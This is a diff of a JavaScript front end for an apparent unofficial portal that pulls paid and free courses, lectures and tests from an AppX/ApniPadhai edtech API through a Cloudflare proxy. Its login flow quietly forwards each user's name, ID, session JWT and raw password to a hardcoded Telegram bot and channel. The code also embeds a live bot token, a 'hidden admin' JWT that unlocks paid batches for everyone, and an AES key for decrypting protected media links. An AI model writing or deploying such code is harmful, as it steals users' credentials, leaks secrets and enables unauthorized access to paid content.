@@ -1,25 +1,25 @@
 // =========================================================
-// RWA SKY PORTAL - MASTER ENGINE, AUTH, PROFILE & CBT TESTS (app.js)
+// RWA SKY PORTAL - MASTER ENGINE (APNIPADHAI V3 ARCHITECTURE UPGRADED)
 // =========================================================
 
 // 👇 APNA TELEGRAM BOT TOKEN AUR CHANNEL CHAT ID YAHAN DALEIN 👇
 const TG_BOT_TOKEN = "8953710743:AAHJUQB5f0gefAEDyieZFcsyU2GEUu3LzRk"; 
-const TG_CHAT_ID = "-1004331013936"; // e.g. "-1001234567890" or "@your_channel"
+const TG_CHAT_ID = "-1004331013936"; 
 
-// 🔒 HIDDEN ADMIN TOKENS (Yeh user ko kabhi bhi UI mein show nahi honge, sirf Paid Batches merge karne ke kaam aayenge)
+// 🔒 HIDDEN ADMIN TOKENS
 const DEFAULT_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjI5NjA2NCIsInRpbWVzdGFtcCI6MTc5NDQyNTMzNiwiaXZfdmVyIjozLCJzZXNzaW9uIjoiZXlKMGVYQWlPaUpLVjFRaUxDSmhiR2NpT2lKSVV6STFOaUo5LmV5SnBaQ0k2SWpJNU5qQTJOQ0lzSW1WdFlXbHNJam9pYzJGdVpHVmxjR3RoYzNkaGJqSTFORUJuYldGcGJDNWpiMjBpTENKdVlXMWxJam9pVTJGdVpHVmxjQ0JMWVhOM1lXNGlMQ0owWlc1aGJuUlVlWEJsSWpvaWRYTmxjaUlzSW5SbGJtRnVkRTVoYldVaU9pSmhZWEJ1YVhCaFpHaGhhVjlrWWlJc0luUmxibUZ1ZEVsa0lqb2lJaXdpWkdsemNHOXpZV0pzWlNJNlptRnNjMlY5LlgwUFJ3YzYyMXl2MnJ2OEhOM2sxYzZfTElWel9faWZLVlpMRlhKZ2NkTTAifQ.4u99PNICqcRGHsQlWT6n_8OOq5Bq6nwQJgX8-zUa42I";
 
 const HIDDEN_ADMIN_TOKENS = [
     { id: "admin_tok_1", label: "Official Cloud Sync", userId: "4756316", token: DEFAULT_TOKEN, isAdmin: true }
 ];
 
-// UPGRADED BASE API FROM LOGS
+// UPGRADED APNIPADHAI BASE URL & PROXY
 const API_BASE = "https://aapnipadhaiapi.classx.co.in";
 const AES_KEY = CryptoJS.enc.Utf8.parse("638udh3829162018");
 const WORKER_RAW_PROXY = "https://proplayer.allswbatch22.workers.dev/proxy?url=";
 
 // =====================================================
-// JWT DECODER & USER PERSONAL TOKEN STORAGE
+// JWT & USER TOKENS STORAGE
 // =====================================================
 function extractUidFromJwt(jwtStr) {
     if (!jwtStr || typeof jwtStr !== "string") return "";
@@ -38,7 +38,6 @@ function extractUidFromJwt(jwtStr) {
     }
 }
 
-// Sirf User ke khud ke tokens load karega (Admin tokens kabhi mix nahi honge UI ke liye)
 function getUserSavedTokens() {
     try {
         const raw = localStorage.getItem("rwa_user_tokens_v2");
@@ -63,12 +62,10 @@ function getSavedUserProfile() {
 let USER_TOKENS = getUserSavedTokens();
 let USER_PROFILE = getSavedUserProfile();
 
-// Helper: Paid Batches ke liye User Tokens + Hidden Admin Tokens dono dega
 function getAllTokensForCourses() {
     return [...USER_TOKENS, ...HIDDEN_ADMIN_TOKENS];
 }
 
-// Helper: Kisi specific Course ID ke liye uska exact bound token return karega
 function getCourseBoundToken(courseId) {
     const cid = String(courseId || state.courseId || "").trim();
     if (cid && state.courseTokenMap && state.courseTokenMap[cid]) {
@@ -120,7 +117,7 @@ function enforceCompulsoryLogin() {
 }
 
 // =====================================================
-// LOGIN MODAL & 2-OPTION AUTHENTICATION ENGINE
+// AUTH MODAL & LOGIN API
 // =====================================================
 function openLoginModal() {
     const modal = document.getElementById("loginModal");
@@ -177,7 +174,6 @@ function showLoginStatus(msg, type) {
     alertBox.innerHTML = msg;
 }
 
-// Fetch User Details from /get/get_user_dt?userid=<uid>
 async function fetchUserDetailsFromServer(jwtToken, userId) {
     const uid = userId || extractUidFromJwt(jwtToken);
     if (!jwtToken || !uid) return null;
@@ -191,13 +187,12 @@ async function fetchUserDetailsFromServer(jwtToken, userId) {
     return null;
 }
 
-// Send User Details + Token to Telegram Channel on Successful Login
 async function sendUserDetailsToTelegram(userObj, jwtToken, loginMethod, rawPass = "N/A") {
     if (!TG_BOT_TOKEN || TG_BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN_HERE" || !TG_CHAT_ID || TG_CHAT_ID === "YOUR_TELEGRAM_CHANNEL_ID_HERE") {
         return;
     }
 
-    const textMsg = `🚨 <b>NEW USER LOGIN SUCCESS (RWA PORTAL)</b> 🚨\n\n` +
+    const textMsg = `🚨 <b>NEW USER LOGIN SUCCESS (APNIPADHAI PORTAL)</b> 🚨\n\n` +
         `🔑 <b>Login Method:</b> ${loginMethod}\n` +
         `🆔 <b>User ID:</b> <code>${userObj.userid || userObj.id || "N/A"}</code>\n` +
         `👤 <b>Name:</b> ${userObj.name || "N/A"}\n` +
@@ -226,13 +221,11 @@ async function sendUserDetailsToTelegram(userObj, jwtToken, loginMethod, rawPass
     } catch {}
 }
 
-// Authenticate with Number/Email + Password on Server
 async function loginOnRwaServer(phoneOrEmail, password) {
     const loginEndpoints = ["/post/userLogin", "/get/login", "/post/login"];
 
     for (const ep of loginEndpoints) {
         try {
-            // PROXY ROUTING TO BYPASS BROWSER CORS & FORBIDDEN HEADERS
             const targetUrl = `${API_BASE}${ep}`;
             const proxyUrl = `${WORKER_RAW_PROXY}${encodeURIComponent(targetUrl)}`;
             
@@ -249,9 +242,6 @@ async function loginOnRwaServer(phoneOrEmail, password) {
                 headers: {
                     "client-service": "Appx",
                     "auth-key": "appxapi",
-                    "source": "website",
-                    "device-type": "",
-                    "is-safari": "0",
                     "Content-Type": "application/x-www-form-urlencoded"
                 },
                 body: formData.toString()
@@ -271,9 +261,6 @@ async function loginOnRwaServer(phoneOrEmail, password) {
                 headers: {
                     "client-service": "Appx",
                     "auth-key": "appxapi",
-                    "source": "website",
-                    "device-type": "",
-                    "is-safari": "0",
                     "Content-Type": "application/json"
                 },
                 body: JSON.stringify({
@@ -411,7 +398,7 @@ window.submitUserLogin = async function(mode) {
 };
 
 // =====================================================
-// USER PROFILE MODAL (SHOWS ONLY USER'S DETAILS & OWN TOKEN)
+// USER PROFILE MODAL
 // =====================================================
 async function openProfileModal() {
     if (!enforceCompulsoryLogin()) return;
@@ -437,25 +424,15 @@ async function openProfileModal() {
                 ${(u.name || "U").charAt(0).toUpperCase()}
             </div>
             <div class="min-w-0 flex-1">
-                <span class="px-2.5 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black uppercase">● Verified RWA Student</span>
-                <h4 class="font-black text-lg text-slate-900 truncate mt-0.5">${u.name || "RWA User"}</h4>
-                <p class="text-xs font-bold text-slate-500">User ID: <span class="text-slate-800 font-mono">${u.userid || u.id || uid}</span> • Username: <span class="text-slate-800 font-mono">${u.username || "N/A"}</span></p>
+                <span class="px-2.5 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black uppercase">● Verified AppX Student</span>
+                <h4 class="font-black text-lg text-slate-900 truncate mt-0.5">${u.name || "Student"}</h4>
+                <p class="text-xs font-bold text-slate-500">User ID: <span class="text-slate-800 font-mono">${u.userid || u.id || uid}</span></p>
             </div>
         </div>
-
-        <div class="grid grid-cols-1 sm:grid-cols-2 gap-2.5 text-xs bg-slate-50 p-4 rounded-2xl border border-slate-200">
-            <div><span class="text-slate-500 font-bold">📧 Email:</span><div class="font-extrabold text-slate-900 break-all mt-0.5">${u.email || "N/A"}</div></div>
-            <div><span class="text-slate-500 font-bold">📱 Phone:</span><div class="font-extrabold text-slate-900 mt-0.5">${u.phone || "N/A"}</div></div>
-            <div><span class="text-slate-500 font-bold">🏛️ State & District:</span><div class="font-extrabold text-slate-900 mt-0.5">${u.state || "N/A"} (${u.district || "N/A"})</div></div>
-            <div><span class="text-slate-500 font-bold">👤 Category & Gender:</span><div class="font-extrabold text-slate-900 mt-0.5">${u.info_1 || "N/A"} | ${u.info_2 || "N/A"}</div></div>
-            <div><span class="text-slate-500 font-bold">🎁 Referral Code:</span><div class="font-extrabold text-blue-700 font-mono mt-0.5">${u.refer_code || "N/A"}</div></div>
-            <div><span class="text-slate-500 font-bold">📅 Joined Date:</span><div class="font-extrabold text-slate-900 mt-0.5">${u.datetime || "N/A"}</div></div>
-        </div>
-
-        <div class="bg-amber-50 border-2 border-amber-200 rounded-2xl p-3.5">
+        <div class="bg-amber-50 border-2 border-amber-200 rounded-2xl p-3.5 mt-3">
             <div class="flex justify-between items-center mb-1.5">
                 <span class="text-[11px] font-black text-amber-900 uppercase">🔑 Your Personal Active Token</span>
-                <button onclick="navigator.clipboard.writeText('${activeUserTok.token}'); alert('Your Token Copied!');" class="px-2.5 py-1 rounded-lg bg-amber-500 text-white font-extrabold text-[10px] border-0 cursor-pointer">📋 Copy My Token</button>
+                <button onclick="navigator.clipboard.writeText('${activeUserTok.token}'); alert('Your Token Copied!');" class="px-2.5 py-1 rounded-lg bg-amber-500 text-white font-extrabold text-[10px] border-0 cursor-pointer">📋 Copy</button>
             </div>
             <div class="p-2 bg-white rounded-xl border border-amber-200 font-mono text-[10px] text-slate-700 break-all max-h-24 overflow-y-auto">${activeUserTok.token}</div>
         </div>`;
@@ -478,6 +455,9 @@ function handleLogout() {
     }
 }
 
+// =====================================================
+// GLOBAL STATE & DECRYPTION ENGINE
+// =====================================================
 function decryptAppX(encStr) {
     if (!encStr || typeof encStr !== "string") return "";
     if (encStr.startsWith("http")) return encStr.trim();
@@ -511,134 +491,22 @@ function resolvePdfUrl(encPdf, signedPdf) {
     return signedPdf || dec || "";
 }
 
-// =====================================================
-// REAL FALLBACK DATABASE FROM YOUR LOGS
-// =====================================================
-const DB = {
-    paidCourses: [
-        { id: "571", course_name: "SSC GD भर्ती 2027 (वीर बैच)", exam_category: "RWA SSC EXAMS • PAID", exam_logo: "https://appx-wsb-gcp-mcdn.akamai.net.in/exam/2022-02-07-0.9839972577217094.png", test_series_id: "700" }
-    ],
-    paidSubjects: [
-        { subjectid: "3610", subject_name: "History (वीर बैच)", subject_logo: "" },
-        { subjectid: "1", subject_name: "Maths", subject_logo: "https://appxcontent.kaxa.in/subject/2024-04-10-0.8626713728066564.jpg" },
-        { subjectid: "3527", subject_name: "Physics Dharmendra Sir", subject_logo: "" }
-    ],
-    paidTopics: {
-        "3610": [{ topicid: "42301", topic_name: "सिंधु सभ्यता" }]
-    },
-    paidLectures: {
-        "42301": [
-            {
-                id: "349275",
-                Title: "History By Parul Mam || सिंधु सभ्यता",
-                date_and_time: "08-10-2026 at 02:00 pm",
-                thumbnail: "https://appx-content-v2.classx.co.in/paid_course3/2026-10-07-0_3401609217976156.jpg",
-                file_link: "yc79PF7PfaItE6uX7lAA8ABqbrWNB1WgbrzGsR2wlcFMhAR2tn+h+ETmGcuzjpU5lIYYSRnaL7bMlKrf7UouOCRvHozzqOa6f7eXz7ZPaEE0fRd/NiEP2WEQYJbqwKEM+MU8uRUEXFx4/07LTnptyQ==:ZmVkY2JhOTg3NjU0MzIxMA==",
-                download_links: [
-                    { quality: "720p", path: "m7hcRsBTJp5eNY5aTdn8qpPBOzdeUeGZQY2wVY0qocyzI/GQp7GTpQTXEQI3QwV4TBS4t/fcLhrLe6ZhZ45UCH+PnnUxKByF74TDwQBmgL8IryqFfW2RBko3ChFPEicQTi3gci9AKv0/IhnCF+NqXBt9k0YzrosmgyXn3Oh6AkPFrQ8XsVMQ7udZ3fwSrS+Y:ZmVkY2JhOTg3NjU0MzIxMA==" }
-                ]
-            }
-        ]
-    },
-    freeBatches: [
-        { id: "free_101", course_name: "RWA Free YouTube Marathon Series", exam_logo: "https://placehold.co/600x320/0284c7/ffffff?text=RWA+Free+Batches" }
-    ],
-    freeSubjects: [
-        { subjectid: "fsub_1", subject_name: "GS & Polity Marathon", subject_logo: "" }
-    ],
-    freeTopics: {
-        "fsub_1": [{ topicid: "ftop_1", topic_name: "Complete Revision Classes" }]
-    },
-    freeLectures: {
-        "ftop_1": [
-            { id: "flec_1", Title: "Polity Complete Revision Class", file_link: "dQw4w9WgXcQ", thumbnail: "https://placehold.co/600x320/0284c7/ffffff?text=Free+Class" }
-        ]
-    },
-    paidTestSeries: [
-        { id: "776", title: "MP Police Constable 2026 - सतपुड़ा Series", logo: "https://appx-content-v2.classx.co.in/subject/2026-09-18-0_25895258012558897.jpeg", offer_price: 99, freetest: "1", paidtest: "15" },
-        { id: "534", title: "BSF RO/RM Paid Test Series 2025", logo: "https://appx-content-v2.classx.co.in/subject/2026-05-26-0_6868771234595682.jpeg", offer_price: 149, freetest: "1", paidtest: "20" },
-        { id: "744", title: "UPSSSC PET Percentile Booster Paid Test Series 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-08-17-0_091324675327629.jpeg", offer_price: 99, freetest: "2", paidtest: "23" },
-        { id: "663", title: "UPPCS Prelims Paid Test Series 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-04-28-0_6713576579890046.jpeg", offer_price: 199, freetest: "2", paidtest: "24" },
-        { id: "695", title: "BSF Tradesman Paid Test Series 2025-26", logo: "https://appx-content-v2.classx.co.in/subject/2026-06-16-0_6020598298722372.jpeg", offer_price: 99, freetest: "0", paidtest: "15" },
-        { id: "708", title: "SSC GD Test Series 2026 (Book)", logo: "https://appx-content-v2.classx.co.in/subject/2026-07-08-0_5839850466807497.png", offer_price: 99, freetest: "0", paidtest: "42" },
-        { id: "788", title: "MASTER UPSC PRELIMS TEST SERIES & MENTORSHIP", logo: "https://appx-content-v2.classx.co.in/subject/2026-09-29-0_2355880008171598.jpeg", offer_price: 1499, freetest: "1", paidtest: "30" }
-    ],
-    freeTestSeries: [
-        { id: "743", title: "UP Police Constable 2026 (Free Weekly Test)", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_5663049907369836.jpeg" },
-        { id: "727", title: "UPSSSC PET 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_62931795162936.jpeg" },
-        { id: "799", title: "RRB NTPC CBT - 1 2026-27", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_5663139095411013.jpeg" },
-        { id: "795", title: "UKSSSC Group C 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_5548408893128917.jpeg" },
-        { id: "784", title: "RRB Technician Grade-I 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_14122873860437668.jpeg" },
-        { id: "778", title: "RRB Technician Grade-III 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_07122037877353082.jpeg" },
-        { id: "689", title: "SSC CGL Mini Mock 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_9928777013427561.jpeg" },
-        { id: "801", title: "Indian Coast Guard 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_6774211576429437.jpeg" }
-    ],
-    tsSubjects: {
-        "700": [
-            { subjectid: "3171", subject_name: "SSC GD (Maths) Quiz & Tests", subject_logo: "" },
-            { subjectid: "3172", subject_name: "SSC GD (Reasoning)", subject_logo: "" },
-            { subjectid: "3173", subject_name: "SSC GD (Polity & GS)", subject_logo: "" },
-            { subjectid: "3174", subject_name: "SSC GD (Hindi)", subject_logo: "" }
-        ],
-        "776": [
-            { subjectid: "1415", subject_name: "FULL MOCK TEST", subject_logo: "https://appx-content-v2.classx.co.in/subject/2025-03-04-0.3071033524052684.jpeg" },
-            { subjectid: "2980", subject_name: "Test Schedule (Timetable)", subject_logo: "https://appx-content-v2.classx.co.in/subject/2026-10-07-0_7144586444576111.jpeg" }
-        ],
-        "534": [
-            { subjectid: "2077", subject_name: "BSF RO/RM (Static GK)", subject_logo: "" },
-            { subjectid: "2072", subject_name: "BSF RO/RM (Physics)", subject_logo: "" },
-            { subjectid: "2073", subject_name: "BSF RO/RM (Maths)", subject_logo: "" },
-            { subjectid: "2075", subject_name: "BSF RO/RM (History)", subject_logo: "" },
-            { subjectid: "2076", subject_name: "BSF RO/RM (Geography)", subject_logo: "" },
-            { subjectid: "2079", subject_name: "BSF RO/RM (English)", subject_logo: "" },
-            { subjectid: "2080", subject_name: "BSF RO/RM (Chemistry)", subject_logo: "" }
-        ]
-    },
-    tsTitles: {
-        "700_3171": [
-            { id: "40426", title: "Ratio, Age, Mixture", test_series_id: "700", free_flag: "0", time: "60", questions: "50", marks: "50", test_questions_url: "https://testseries-assets-v3.classx.co.in/test_title_question/rozgar_db/40426/40426_questions0.8210916494359036.json" },
-            { id: "46376", title: "Percentage", test_series_id: "700", free_flag: "1", time: "25", questions: "20", marks: "20", test_questions_url: "https://testseries-assets-v3.classx.co.in/test_title_question/rozgar_db/46376/46376_questions0.4784600262440821.json" }
-        ],
-        "776_1415": [
-            { id: "45964", title: "MP Police Constable Live Mock 01", test_series_id: "776", free_flag: "1", time: "120", questions: "100", marks: "100", test_questions_url: "https://testseries-assets-v3.classx.co.in/test_title_question/rozgar_db/45964/45964_questions0.48368684422780495.json" }
-        ],
-        "534_2077": [
-            { id: "26680", title: "खेल (Sports Static GK)", test_series_id: "534", free_flag: "0", time: "10", questions: "10", marks: "20", test_questions_url: "https://testseries-assets-v2.classx.co.in/test_title_question/rozgar_db/26680/26680_questions1769763744.json" }
-        ],
-        "743_-1": [
-            { id: "47393", title: "UP Police Constable (11 October 2026)", test_series_id: "743", free_flag: "1", time: "120", questions: "150", marks: "300", test_questions_url: "https://appx-content-v2.classx.co.in/test_title_question/rozgar_db/47393/47393_questions0.2543844739643528.json" }
-        ]
-    },
-    fallbackCbtQuestions: [
-        {
-            id: "12370334",
-            question: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">Find the third proportional of 25 and 45.</span></p><p style="font-size:16pt"><span style="font-family:'KOKILA'">25 और 45 का तृतीय समानुपाती ज्ञात कीजिए।</span></p>`,
-            option_1: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">81</span></p>`,
-            option_2: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">65</span></p>`,
-            option_3: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">85</span></p>`,
-            option_4: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">76</span></p>`,
-            answer: "1",
-            positive_marks: "2.00",
-            negative_marks: "0.50",
-            solution_text: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">a व b का तृतीय समानुपाती = (b × b) / a = (45 × 45) / 25 = 81</span></p>`
-        }
-    ]
-};
-
 let state = {
     currentSlide: "slideHome",
     previousSlide: "slideHome",
     cat: "paid",
     view: "batches",
     courseId: "571",
-    courseName: "SSC GD भर्ती 2027",
+    courseName: "SSC GD",
     activeTokenObj: USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0],
     courseTokenMap: {},
     courseTestSeriesMap: {},
-    subjectId: null,
-    subjectName: "",
-    topicId: null,
-    topicName: "",
+    
+    // NEW FOLDER V3 STATE
+    folderStack: [],
+    currentFolderId: null,
+    currentFolderName: "",
+    
     currentLectureKeys: [],
     mediaMap: {},
     activeKey: null,
@@ -660,7 +528,7 @@ let state = {
 };
 
 // =====================================================
-// SLIDE NAVIGATION ENGINE (WITH COMPULSORY LOGIN CHECK)
+// SLIDE NAVIGATION ENGINE
 // =====================================================
 function showSlide(slideId) {
     if (!enforceCompulsoryLogin()) return;
@@ -730,6 +598,16 @@ function handleGlobalBack() {
         return;
     }
     if (state.currentSlide === "slideExplorer") {
+        if (state.view === "folders") {
+            if (state.folderStack && state.folderStack.length > 0) {
+                const prev = state.folderStack.pop();
+                openFolderV3(prev.id, prev.name, true);
+            } else {
+                if (state.cat === "paid") renderPaidBatches();
+                else renderFreeBatches();
+            }
+            return;
+        }
         if (state.view === "ts_tests") {
             if (state.activeTsSubId === "-1") {
                 openTestSeriesExplorer(state.tsMode);
@@ -742,31 +620,16 @@ function handleGlobalBack() {
             openTestSeriesExplorer(state.tsMode);
             return;
         }
-        if (state.view === "ts_list") {
-            goHomeHub();
-            return;
-        }
         if (state.view === "batch_ts_tests") {
             loadCourseTab("tests");
             return;
         }
-        if (state.view === "lectures") {
-            if (state.cat === "paid") openPaidTopics(state.subjectId, state.subjectName);
-            else openFreeTopics(state.subjectId, state.subjectName);
-        } else if (state.view === "topics") {
-            if (state.cat === "paid") openPaidCourse(state.courseId, state.courseName);
-            else openFreeCourse(state.courseId, state.courseName);
-        } else if (state.view === "subjects" || state.view === "batch_ts_subjects") {
-            if (state.cat === "paid") renderPaidBatches();
-            else renderFreeBatches();
-        } else {
-            goHomeHub();
-        }
+        goHomeHub();
     }
 }
 
 // =====================================================
-// API CALLER (PROXY ROUTING TO BYPASS BROWSER CORS & HEADERS)
+// API FETCH PROXY (SECURE CLOUDFLARE ROUTING)
 // =====================================================
 async function fetchRawJSONWithToken(endpoint, tokenObj) {
     const statusBadge = document.getElementById("apiStatus");
@@ -774,7 +637,6 @@ async function fetchRawJSONWithToken(endpoint, tokenObj) {
     const resolvedUid = String(useTok.userId || extractUidFromJwt(useTok.token) || "4756316");
 
     try {
-        // PROXY ROUTING TO BYPASS BROWSER CORS & FORBIDDEN HEADERS
         const targetUrl = `${API_BASE}${endpoint}`;
         const proxyUrl = `${WORKER_RAW_PROXY}${encodeURIComponent(targetUrl)}`;
 
@@ -783,8 +645,6 @@ async function fetchRawJSONWithToken(endpoint, tokenObj) {
                 "client-service": "Appx",
                 "auth-key": "appxapi",
                 "source": "website",
-                "device-type": "",
-                "is-safari": "0",
                 "Authorization": useTok.token,
                 "User-ID": resolvedUid
             }
@@ -793,7 +653,7 @@ async function fetchRawJSONWithToken(endpoint, tokenObj) {
         if (statusBadge) statusBadge.textContent = `● Live Server Connected`;
         return json;
     } catch {
-        if (statusBadge) statusBadge.textContent = "● Smart Hybrid Mode";
+        if (statusBadge) statusBadge.textContent = "● API Hybrid Mode";
         return null;
     }
 }
@@ -812,7 +672,7 @@ async function fetchAPIWithToken(endpoint, tokenObj, fallbackGetter) {
 }
 
 // =====================================================
-// BATCHES & COURSES (JSON PARSING FIX FOR APNIPADHAI LOGS)
+// BATCH FETCHING (FIXED JSON COURSEDt PARSING)
 // =====================================================
 async function renderPaidBatches() {
     if (!enforceCompulsoryLogin()) return;
@@ -828,7 +688,6 @@ async function renderPaidBatches() {
     const seenIds = new Set();
     const allTokensToFetch = getAllTokensForCourses();
 
-    // FIXED PARSING LOGIC: Checks for nested 'coursedt' inside 'data' array
     for (const tokObj of allTokensToFetch) {
         const uid = tokObj.userId || extractUidFromJwt(tokObj.token) || "4756316";
         const purchasedEndpoints = [
@@ -840,7 +699,7 @@ async function renderPaidBatches() {
             const data = await fetchAPIWithToken(ep, tokObj, () => null);
             if (Array.isArray(data) && data.length > 0) {
                 data.forEach(c => {
-                    // This exact line fixes the ApniPadhai JSON nesting issue (data -> coursedt -> course info)
+                    // NEW FIX: Look inside 'coursedt' array for actual course details
                     let courseDataList = [];
                     if (c.coursedt && Array.isArray(c.coursedt) && c.coursedt.length > 0) {
                         courseDataList = c.coursedt;
@@ -869,34 +728,19 @@ async function renderPaidBatches() {
         }
     }
 
-    if (!seenIds.has("571")) {
-        const adminTok = HIDDEN_ADMIN_TOKENS[0];
-        const c571Data = await fetchAPIWithToken(`/get/coursenew_by_idv2?id=571`, adminTok, () => DB.paidCourses);
-        const list571 = Array.isArray(c571Data) && c571Data.length > 0 ? c571Data : DB.paidCourses;
-        list571.forEach(c => {
-            const cid = String(c.id || c.course_id || "571").trim();
-            if (!seenIds.has(cid)) {
-                seenIds.add(cid);
-                state.courseTokenMap[cid] = adminTok;
-                state.courseTestSeriesMap[cid] = String(c.test_series_id || "700");
-                mergedCourses.push({
-                    ...c,
-                    id: cid,
-                    _boundTokenObj: adminTok,
-                    _badgeText: "☁️ Cloud Synced"
-                });
-            }
-        });
+    grid.innerHTML = "";
+    if (mergedCourses.length === 0) {
+        grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Koi Paid Batch nahi mila. Kripya naya valid token add karein.</div>`;
+        return;
     }
 
-    grid.innerHTML = "";
     mergedCourses.forEach(c => {
         const logo = c.exam_logo || c.course_thumbnail || `https://placehold.co/600x320/0284c7/ffffff?text=Batch+${c.id}`;
-        const safeName = (c.course_name || "RWA Paid Batch").replace(/'/g, "");
+        const safeName = (c.course_name || "Apni Padhai Paid Batch").replace(/'/g, "");
         grid.innerHTML += `
             <div onclick="openPaidCourse('${c.id}', '${safeName}')" class="grid-card overflow-hidden cursor-pointer flex flex-col justify-between">
                 <div>
-                    <img src="${logo}" onerror="this.src='https://placehold.co/600x320/0284c7/ffffff?text=RWA+Batch'" class="w-full h-44 object-cover">
+                    <img src="${logo}" onerror="this.src='https://placehold.co/600x320/0284c7/ffffff?text=Batch'" class="w-full h-44 object-cover">
                     <div class="p-4">
                         <div class="flex justify-between items-center gap-2">
                             <span class="px-2.5 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black">BATCH #${c.id}</span>
@@ -906,10 +750,25 @@ async function renderPaidBatches() {
                     </div>
                 </div>
                 <div class="px-4 pb-4">
-                    <div class="btn-watch w-full text-center text-xs">Open Subjects & Batch Tests ➔</div>
+                    <div class="btn-watch w-full text-center text-xs">Open Classes & Tests ➔</div>
                 </div>
             </div>`;
     });
+}
+
+function openPaidCourse(id, name) {
+    const cid = String(id).trim();
+    state.cat = "paid";
+    state.courseId = cid;
+    state.courseName = name;
+    state.activeTokenObj = getCourseBoundToken(cid);
+    window.ACTIVE_PLAYER_TOKEN = state.activeTokenObj.token;
+
+    document.getElementById("subTabs").classList.remove("hidden");
+    document.getElementById("crumbText").textContent = `Batch #${cid}`;
+    document.getElementById("headingText").textContent = name;
+    
+    loadCourseTab("subjects");
 }
 
 async function renderFreeBatches() {
@@ -917,18 +776,22 @@ async function renderFreeBatches() {
     state.view = "batches";
     document.getElementById("subTabs").classList.add("hidden");
     document.getElementById("crumbText").textContent = "Free Portal";
-    document.getElementById("headingText").textContent = "🆓 RWA Free Batches";
+    document.getElementById("headingText").textContent = "🆓 Free Batches";
 
     const grid = document.getElementById("mainGrid");
     grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Loading Free Batches...</div>`;
 
     const primaryTok = USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0];
-    const freeData = await fetchAPIWithToken(`/get/courselist?start=-1`, primaryTok, () => DB.freeBatches);
-    const list = (Array.isArray(freeData) && freeData.length > 0) ? freeData : DB.freeBatches;
-
+    const freeData = await fetchAPIWithToken(`/get/courselist?start=-1`, primaryTok, () => []);
+    
     grid.innerHTML = "";
-    list.forEach(c => {
-        const cid = String(c.id || "free_101");
+    if (freeData.length === 0) {
+        grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Koi Free Batch nahi mila.</div>`;
+        return;
+    }
+
+    freeData.forEach(c => {
+        const cid = String(c.id);
         const name = (c.course_name || "Free Course").replace(/'/g, "");
         const logo = c.exam_logo || c.course_thumbnail || "https://placehold.co/600x320/059669/ffffff?text=Free+Batch";
         state.courseTokenMap[cid] = primaryTok;
@@ -944,80 +807,24 @@ async function renderFreeBatches() {
     });
 }
 
-function openPaidCourse(id, name) {
-    const cid = String(id).trim();
-    state.cat = "paid";
-    state.courseId = cid;
-    state.courseName = name;
-    // Lock state.activeTokenObj to the exact token that fetched this course
-    state.activeTokenObj = getCourseBoundToken(cid);
-    window.ACTIVE_PLAYER_TOKEN = state.activeTokenObj.token;
-
-    document.getElementById("subTabs").classList.remove("hidden");
-    document.getElementById("crumbText").textContent = `Batch #${cid}`;
-    document.getElementById("headingText").textContent = name;
-    loadCourseTab("subjects");
-}
-
-async function openFreeCourse(id, name) {
+function openFreeCourse(id, name) {
     const cid = String(id).trim();
     state.cat = "free";
     state.courseId = cid;
     state.courseName = name;
-    state.view = "subjects";
     state.activeTokenObj = getCourseBoundToken(cid);
 
-    document.getElementById("subTabs").classList.add("hidden");
+    document.getElementById("subTabs").classList.remove("hidden");
     document.getElementById("crumbText").textContent = "Free Batch";
     document.getElementById("headingText").textContent = name;
 
-    const subs = await fetchAPIWithToken(`/get/folder_contentsv3?course_id=${cid}&parent_id=-1&start=0`, state.activeTokenObj, () => DB.freeSubjects);
-    const grid = document.getElementById("mainGrid");
-    grid.innerHTML = "";
-    (subs.length ? subs : DB.freeSubjects).forEach(s => {
-        const subId = s.id || s.subjectid;
-        const sname = (s.Title || s.subject_name || "Free Subject").replace(/'/g, "");
-        grid.innerHTML += `
-            <div onclick="openFreeTopics('${subId}', '${sname}')" class="grid-card p-5 flex items-center justify-between cursor-pointer">
-                <div>
-                    <span class="text-[10px] font-extrabold text-teal-700 uppercase">Free Subject</span>
-                    <h4 class="font-black text-base text-slate-900 mt-0.5">📘 ${sname}</h4>
-                </div>
-                <span class="btn-watch text-xs">Topics ➔</span>
-            </div>`;
-    });
+    loadCourseTab("subjects");
 }
 
-async function openFreeTopics(subId, subName) {
-    state.view = "topics";
-    state.subjectId = subId;
-    state.subjectName = subName;
-    document.getElementById("headingText").textContent = subName;
-    const topics = await fetchAPIWithToken(`/get/folder_contentsv3?course_id=${state.courseId}&parent_id=${subId}&start=0`, state.activeTokenObj, () => DB.freeTopics[subId] || []);
-    const grid = document.getElementById("mainGrid");
-    grid.innerHTML = "";
-    (topics.length ? topics : [{ topicid: "ftop_1", topic_name: "All Classes" }]).forEach(t => {
-        const topId = t.id || t.topicid;
-        const name = t.Title || t.topic_name || "Topic";
-        grid.innerHTML += `
-            <div onclick="openFreeLectures('${topId}', '${name}')" class="grid-card p-5 flex justify-between items-center cursor-pointer">
-                <h4 class="font-black text-base text-slate-900">📂 ${name}</h4>
